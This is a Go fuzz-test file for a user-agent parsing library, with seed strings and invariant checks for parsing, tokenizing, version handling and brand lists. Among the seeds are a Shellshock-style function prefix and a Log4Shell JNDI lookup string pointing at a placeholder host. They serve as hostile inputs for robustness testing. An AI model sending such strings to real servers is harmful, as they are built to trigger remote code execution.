package useragent

import (
	"strings"
	"testing"
)

func FuzzParse(f *testing.F) {
	seeds := []string{
		"",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome/120.0.0.0 Safari/537.36",
		"Scrapy/2.6.3 (+https://scrapy.org)",
		"CFNetwork/1404.0.5 Darwin/22.3.0 (iPhone iOS/16.3.1)",
		"cloud-run-proxy/source (darwin/arm64)",
		"() { ignored; }; echo Content-Type: text/plain",
		"${jndi:ldap://example.invalid/a}",
		strings.Repeat("A", 4096),
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, raw string) {
		ua := Parse(raw)
		if ua.Raw != raw {
			t.Fatalf("Raw changed")
		}
		if ua.Browser.VersionNo != ParseVersion(ua.Browser.Version) {
			t.Fatalf("Browser.VersionNo %+v != ParseVersion(%q) %+v", ua.Browser.VersionNo, ua.Browser.Version, ParseVersion(ua.Browser.Version))
		}
		if ua.OS.VersionNo != ParseVersion(ua.OS.Version) {
			t.Fatalf("OS.VersionNo mismatch")
		}
		if ua.Device.Type > DeviceEmbedded {
			t.Fatalf("Device.Type out of range: %d", ua.Device.Type)
		}
		if ua.Bot.Category > BotOther {
			t.Fatalf("Bot.Category out of range: %d", ua.Bot.Category)
		}
		if ua.Bot.Detected && ua.Bot.Name == "" {
			t.Fatalf("detected bot without a name")
		}
		_ = ua.String()
		_ = ua.IsUnknown()
	})
}

func FuzzTokenizer(f *testing.F) {
	for _, s := range []string{
		"",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ3A.230805.001; wv) Chrome/120.0.0.0 Mobile",
		"Product/1.2 (comment; key=value) Other/3.4",
		strings.Repeat(";", 10000),
		strings.Repeat("A", 1<<20),
		"\x00\x01\x02\xff",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, raw string) {
		ts := tokenize(raw)
		if ts.n < 0 || ts.n > maxTokens {
			t.Fatalf("token count %d is out of bounds", ts.n)
		}
		if ts.cn < 0 || ts.cn > maxComments {
			t.Fatalf("comment count %d is out of bounds", ts.cn)
		}
		if ts.raw != raw {
			t.Fatal("raw input changed")
		}
		_ = ts.get("Chrome")
		_ = ts.hasPrefix("Mozilla")
		_ = ts.hasSuffix("Safari")
	})
}

func FuzzParseVersion(f *testing.F) {
	for _, s := range []string{"", "1.2.3", "10_15_7", "v120.0.0.0", "1..2", "abc", "999999999999999999999"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		v := ParseVersion(s)
		if round := ParseVersion(v.String()); round != v {
			t.Fatalf("ParseVersion not stable: %q => %+v => %+v", s, v, round)
		}
		_ = v.Short()
		other := v
		_ = v.Compare(other)
		_ = v.AtLeast(v.Major, v.Minor, v.Patch)
	})
}

func FuzzParseBrandList(f *testing.F) {
	for _, s := range []string{
		"",
		`"Chromium";v="120", "Google Chrome";v="120"`,
		`"Not, A Brand";v="8"`,
		`garbage, "A";v="1", "unterminated`,
		strings.Repeat(`"A";v="1",`, 100),
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		for _, b := range ParseBrandList(s) {
			if b.Name == "" {
				t.Fatalf("empty brand name from %q", s)
			}
		}
	})
}
